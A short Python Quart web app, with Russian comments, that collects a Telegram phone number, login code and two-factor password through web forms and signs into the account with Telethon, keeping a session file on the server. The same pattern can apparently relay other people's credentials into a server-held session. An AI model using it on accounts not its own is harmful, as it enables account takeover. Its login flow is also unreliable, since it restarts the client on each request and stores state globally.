from quart import Quart, request, render_template
from telethon import TelegramClient
import asyncio

app = Quart(__name__)

# Замените на свои значения API ID и API Hash
api_id = '**********'
api_hash = '********************************'

# Сохраняем состояние между запросами
app.config['PHONE'] = None
app.config['CODE'] = None

# Этап авторизации в Telegram
async def start_telegram_client(phone, code=None, password=None):
    session_name = 'telegram_auth'
    client = TelegramClient(session_name, api_id, api_hash)

    # Запуск авторизации с номером телефона
    await client.start(phone)

    if code:
        # Вводим код
        await client.sign_in(phone, code=code)
    elif password:
        # Вводим пароль
        await client.sign_in(password=password)

    me = await client.get_me()
    return me.first_name, me.username

@app.route('/')
async def phone():
    return await render_template('phone.html')  # Форма для ввода номера телефона

@app.route('/code', methods=['POST'])
async def code():
    phone = request.form['phone']
    app.config['PHONE'] = phone  # Сохраняем номер телефона

    try:
        # Запускаем авторизацию и отправляем код
        first_name, username = await start_telegram_client(phone)
        print(f"Код отправлен на {phone}. Введите код на следующей странице.")
        return await render_template('code.html')  # Форма для ввода кода
    except Exception as e:
        return f"Ошибка при отправке кода: {str(e)}"

@app.route('/password', methods=['POST'])
async def password():
    code = request.form['code']
    phone = app.config['PHONE']
    app.config['CODE'] = code  # Сохраняем код

    try:
        # Авторизуемся с кодом
        first_name, username = await start_telegram_client(phone, code)
        print(f"Код введен. Теперь введите пароль на следующей странице.")
        return await render_template('password.html')  # Форма для ввода пароля
    except Exception as e:
        return f"Ошибка при авторизации с кодом: {str(e)}"

@app.route('/login', methods=['POST'])
async def login():
    password = request.form['password']
    phone = app.config['PHONE']
    code = app.config['CODE']

    try:
        # Авторизуемся с паролем
        first_name, username = await start_telegram_client(phone, code=code, password=password)
        return f"Успешно авторизованы как {first_name} ({username})"
    except Exception as e:
        return f"Ошибка при авторизации с паролем: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True)
